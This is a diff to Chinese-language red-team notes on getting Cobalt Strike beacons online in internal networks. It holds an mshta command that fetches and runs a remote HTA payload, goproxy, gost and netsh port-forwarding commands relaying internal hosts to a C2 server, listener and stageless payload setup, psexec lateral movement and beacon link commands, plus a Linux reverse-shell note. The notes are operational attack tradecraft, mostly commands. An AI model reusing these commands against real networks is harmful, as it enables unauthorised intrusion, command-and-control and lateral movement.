@@ -74,8 +74,9 @@ mshta http://xx/file.hta
 5. 中转上线
 6. [仅ICMP出网pingtunnel上线msf&cs](https://xz.aliyun.com/t/10626#toc-9)
 6. [仅ICMP出网SPP上线Cobalt Strike](https://xz.aliyun.com/t/10626#toc-16)
-
 5. pystinger
+
+[bind_tcp | 内网隧道的多种应用方式 | cobalt strke正向连接多层内网, 反向](https://mp.weixin.qq.com/s/iZxmQJQrLs7XP7XlhGfHmA)
 
 0.bind方式上线
 ```
@@ -90,10 +91,12 @@ mshta http://xx/file.hta
 3.扫出来的主机 右击 - Jump - psexec64 -选一个账号, - listener:smb
 ```
 
-3.代理上线
+3.[代理上线](https://blog.csdn.net/st3pby/article/details/127683826)
 ```shell
-#1.边缘主机131上代理服务 goproxy 
+#0. 攻击机1.89, 边缘机双ip:1.88/111.131, 内网111.236
+#1. 边缘主机131上代理服务 goproxy 
 proxy.exe http -t tcp -p "0.0.0.0:8080" --daemon
+gost -L=8080 -L=tcp://:822/:8080
 #2.然后端口转发到外网ip88上, netsh 总出问题，建议用别的。或者每次删除掉再add
 netsh interface portproxy add v4tov4 listenaddress=192.168.111.131 listenport=822 connectaddress=192.168.1.88 connectport=8080
 #3.cs端 创建 Listener，配置如下
@@ -101,7 +104,6 @@ HTTP HOSTS: 192.168.1.89
 HTTP Port: 随便填
 HTTP Proxy: http://192.168.111.131:822
 # 连接过程  192.168.111.236  → 192.168.111.131:822→ 192.168.1.88:8080→ C2(192.168.1.89)
-# 攻击机89, 边缘机双ip:1.88/111.131, 内网111.236
 #4.生成stageless payload
 ```
 重要: __生成stageless payload__
@@ -122,7 +124,7 @@ HTTP Proxy: http://192.168.111.131:822
 菜单Attack - Executable(S), 生成stateless 的 exe, listener: pivot
 ```
 #### 上线Linux
-CrossC2 - 上线linux插件
+CrossC2 - 上线linux插件, 只支持https
 
 ```shell
 # reverse shell
@@ -158,7 +160,8 @@ erwerwer
 # ec2 - smb 是一个Listener
 beacon > jump psexec64 FILESERVER ec2 - smb
 
-beacon > connect [host] [port] # Link to a Beacon peer
+beacon > link [host] [port]    # beacon_smb/bind_pipe
+beacon > connect [host] [port] # Link to a Beacon peer, 对应  beacon_tcp/bind_tcp
 beacon > unlink 10.10.10.191 1052 # De-link to a Beacon peer
 beacon > rev2self # 恢复原始令牌
 
